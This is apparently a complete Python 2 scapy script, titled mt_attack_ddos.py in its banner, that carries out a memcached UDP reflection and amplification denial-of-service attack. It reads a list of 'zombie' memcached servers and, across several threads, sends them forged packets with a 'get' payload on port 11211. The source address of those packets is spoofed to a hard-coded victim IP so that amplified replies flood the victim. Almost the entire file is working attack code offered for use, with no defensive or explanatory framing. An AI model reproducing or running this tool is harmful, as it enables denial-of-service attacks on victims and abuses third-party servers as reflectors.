# -*- coding: UTF-8 -*-
'''
Created on 2018.02.06
@author: 5t4rk
'''
#!/usr/bin/python
from scapy.all import *
import sys
import threading
victim_address = "192.168.31.7"
victim_port = 80
def udp_forge_packets(mem_address, mem_port, target_address, target_port, payload):
    pkt = scapy.all.IP(dst=mem_address, src=target_address) / scapy.all.UDP(sport=target_port, dport=mem_port) / payload
    send(pkt, inter=1, count=3)
def ddos_attack_targets(mem_address, mem_port, target_address, target_port, payload, index):
    global total_times
    total_times = total_times + 1
    if (not mem_address):
        return False
    if (not mem_port):
        return False
    if (not target_address):
        return False
    if (not target_port):
        return False
    else:
        try:
            mem_address = mem_address.strip('\n')
            mem_address = mem_address.strip('\r\n')
            mem_address = mem_address.strip()
            target_address = target_address.strip('\n')
            target_address = target_address.strip('\r\n')
            target_address = target_address.strip()
            # send 
            udp_forge_packets(mem_address, mem_port, target_address, target_port, payload)
            print "[count: %5d]" % total_times, "[index: %5d ]" % index, "[address: %s]" % mem_address
        except Exception, e:
            print "[error :", e.message, "]"
        return True 
def load_zombies_list(zombies_server_path):
    try:
        global zombies_list
        if (len(zombies_server_path) < 1):
            return ""
        with open(zombies_server_path) as f:
            zombies_list = f.readlines()
        return zombies_list
    except Exception, e:
        print e.message
def banner_help():
    print'''
----------------------------------------------------------
             _____ _     ___      _ 
            |  ___| |   /   |    | |
            |___ \| |_ / /| |_ __| | __   
                \ \ __/ /_| | '__| |/ /
            /\__/ / |_\___  | |  |   < 
            \____/ \__|   |_/_|  |_|\_\
  
----------------------------------------------------------
'''
    print "Example:\t"
    print "\tmt_attack_ddos.py server.txt 10 1"
    print "\t<path> <thread> <times>"
    print "\t<option1> 1 server.txt"
    print "\t<option2> 2 ddos thread"
    print "\t<option3> 3 ddos times"
    print "----------------------------------------------------------"

def thread_process(start_index, end_index, times=1):
    keep = start_index
    loop = times
    while loop > 0:
        while start_index < end_index:
            try:
                payload = "\x00\x00\x00\x00\x00\x01\x00\x00get anVzdGF0ZXN0\r\n"
                mem_address = zombies_list[start_index]
                mem_address = mem_address.strip('\n')
                mem_address = mem_address.strip('\r\n')
                mem_address = mem_address.strip()
                ddos_attack_targets(mem_address, 11211, victim_address, victim_port, payload, start_index)
                start_index = start_index + 1
            except Exception, e:
                start_index = start_index + 1
        loop = loop - 1
        start_index = keep
def create_thread(thread_num=10, attack_times=2):
    threads = []
    try:
        total = len(zombies_list)
        mod = int(total % thread_num)
        remain = int(total / thread_num)
        for i in range(thread_num):
            if mod == 0:
                t = threading.Thread(target=thread_process, args=(i * remain, (i + 1) * remain, attack_times))
                print 'thread %d start ' % i
            else:
                if i == thread_num - 1:
                    t = threading.Thread(target=thread_process, args=(i * remain, (i + 1) * remain + mod, attack_times))
                    print 'thread %d start ' % i
                else:
                    t = threading.Thread(target=thread_process, args=(i * remain, (i + 1) * remain, attack_times))
                    print 'thread %d start ' % i
            threads.append(t)
        for each in threads:
            each.start()
            each.join()
    except KeyboardInterrupt, e:
        print "Ctrl-c pressed ..."
        sys.exit(1)
    except Exception, e:
        print e.message
if __name__ == '__main__':
    zombies_list = []
    total_times = 0
    if len(sys.argv) == 4:
        load_zombies_list(sys.argv[1])
        create_thread(int(sys.argv[2]), int(sys.argv[3]))
    else:
        banner_help()
        exit()
    pass